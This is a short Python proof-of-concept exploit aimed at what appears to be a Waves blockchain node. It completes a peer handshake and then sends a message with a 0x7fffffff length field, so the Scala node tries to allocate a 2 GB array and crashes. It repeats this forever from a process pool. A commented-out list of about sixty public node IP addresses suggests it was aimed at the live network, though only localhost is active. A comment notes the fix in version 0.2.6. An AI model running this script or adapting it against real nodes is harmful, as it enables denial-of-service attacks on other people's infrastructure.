#!/usr/bin/python3

# Fixed in 0.2.6
#
# How to fix the bug:
# Add an assert in MessageHandler.scala for length, so that scala doesn't try to allocate 2**31 byte array.

import socket, time
from multiprocessing import Pool

#nodes = ['212.83.176.26', '139.162.181.204', '130.211.240.10', '31.43.101.66', '82.8.59.60', '51.255.46.133', '52.51.92.182', '163.172.144.233', '23.94.190.226', '193.124.182.134', '86.93.11.119', '195.37.209.147', '85.255.4.208', '52.30.47.67', '178.21.118.37', '81.88.208.178', '93.186.255.245', '104.198.2.225', '178.218.117.66', '178.79.164.220', '45.63.89.38', '91.107.104.167', '69.30.201.234', '130.211.76.69', '159.203.187.109', '159.203.186.143', '94.127.219.245', '138.201.247.72', '104.236.219.81', '81.88.208.180', '84.22.115.12', '139.59.185.243', '137.74.112.39', '193.172.33.72', '193.124.182.142', '42.93.36.86', '95.183.48.178', '178.21.112.237', '139.59.213.17', '178.21.112.50', '52.77.111.219', '104.250.143.14', '139.162.172.252', '139.162.172.167', '96.84.69.81', '190.10.8.150', '46.228.6.34', '137.74.112.73', '51.255.212.134', '138.201.91.160', '94.214.44.158', '104.154.57.29', '163.172.158.246', '52.28.66.217', '87.106.15.184', '139.59.165.114', '193.124.182.113', '104.198.8.205', '84.238.148.25', '190.10.8.74', '77.174.135.61']
nodes = ["127.0.0.1"]

TCP_PORT = 6863
BUFFER_SIZE = 1024

def generate_handshake():
    import random
    nonce = b""
    for i in range(8):
        nonce += bytearray((random.randint(0,255),))
    HANDSHAKE = b"""\x05\x77\x61\x76\x65\x73\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x00\
\x00\x04\x05\x62\x63\x64\x65\x76""" + nonce + b"""\
\x00\x00\x00\x00\x00\x00\x00\x00\
\x57\xda\x74\xf9"""
    return HANDSHAKE

# Message:
# Length - 4 bytes, 0x100000 is MAX
# MAGIC - 4 bytes - \x12\x34\x56\x78
# Message code - 1 byte
# Data length - 4 bytes signed
def nuke(ip):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, TCP_PORT))
        s.send(generate_handshake())
        s.send(b"\x00\x00\x00\x09\x12\x34\x56\x78\x01\x7f\xff\xff\xff")

        data = s.recv(BUFFER_SIZE)
        time.sleep(2)
        s.close()
    except: pass

while True:
    p = Pool(len(nodes) * 10)
    p.map(nuke, nodes * 10)

